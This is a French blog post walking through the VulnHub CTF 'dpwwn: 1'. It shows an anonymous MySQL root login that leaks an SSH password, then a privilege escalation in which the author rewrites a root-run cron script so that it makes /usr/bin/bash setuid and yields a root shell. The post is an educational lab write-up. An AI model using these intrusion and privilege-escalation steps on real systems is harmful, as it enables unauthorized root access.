---
title: "Solution du CTF dpwwn #1 de VulnHub"
tags: [CTF, VulnHub]
---

J'ai passé plus de temps à mettre en place la VM du [dpwwn: 1](https://vulnhub.com/entry/dpwwn-1,342/) qu'à l'exploiter : impossible de la faire fonctionne sur VirtualBox selon lequel il manquait des disques et j'ai eu plusieurs ratées sur VMWare concernant la récupération d'une adresse IP.

Finalement au bout d'un moment l'import de la VM a fonctionné dans VMWare. Le système était extrêmement lent, mais ça fonctionnait.

La machine expose trois ports :

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

Sur le serveur web, on trouve juste un `info.php` correspondant à un `phpinfo()`. Il contient une adresse IPv6 mais un scan supplémentaire n'a remonté aucun nouveau port.

J'ai alors essayé de me connecter sur le MySQL en `root` et sans mot de passe et ça a fonctionné :

```console
$ mysql -u root -h 192.168.242.128
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2
Server version: 5.5.60-MariaDB MariaDB Server

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| ssh                |
+--------------------+
4 rows in set (0,003 sec)

MariaDB [(none)]> use ssh;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [ssh]> show tables;
+---------------+
| Tables_in_ssh |
+---------------+
| users         |
+---------------+
1 row in set (0,001 sec)

MariaDB [ssh]> select * from users;
+----+----------+---------------------+
| id | username | password            |
+----+----------+---------------------+
|  1 | mistic   | testP@$$swordmistic |
+----+----------+---------------------+
1 row in set (0,001 sec)
```

Ce mot de passe présent dans la base `ssh` permet sans trop de surprise de se connecter sur le service du même nom.

On découvre dans le dossier personnel de l'utilisateur un script bash :

```
-rwx------. 1 mistic mistic 186  1 août   2019 logrot.sh
```

Ce dernier n'a rien d'intéressant :

```bash
#!/bin/bash
#
#LOGFILE="/var/tmp"
#SEMAPHORE="/var/tmp.semaphore"


while : ; do
  read line
  while [[ -f $SEMAPHORE ]]; do
    sleep 1s
  done
  printf "%s\n" "$line" >> $LOGFILE
done
```

On se dit qu'il est sans doute appelé par une crontab et c'est bien le cas :

```console
[mistic@dpwwn-01 ~]$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/3 *  * * *  root  /home/mistic/logrot.sh
```

Vu que l'on est propriétaire du fichier, on va écraser son contenu pour obtenir un shell setuid root :

```console
[mistic@dpwwn-01 ~]$ echo -e '#!/bin/bash\nchmod 4755 /usr/bin/bash' > logrot.sh
[mistic@dpwwn-01 ~]$ sleep 180
[mistic@dpwwn-01 ~]$ ls -l /usr/bin/bash
-rwsr-xr-x. 1 root root 918400 30 oct.   2018 /usr/bin/bash
[mistic@dpwwn-01 ~]$ bash -p
bash-4.2# id
uid=1000(mistic) gid=1000(mistic) euid=0(root) groupes=1000(mistic) contexte=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash-4.2# cd /root
bash-4.2# ls
anaconda-ks.cfg  dpwwn-01-FLAG.txt
bash-4.2# cat dpwwn-01-FLAG.txt

Congratulation! I knew you can pwn it as this very easy challenge. 

Thank you. 


64445777
6e643634 
37303737 
37373665 
36347077 
776e6450 
4077246e
33373336 
36359090
```


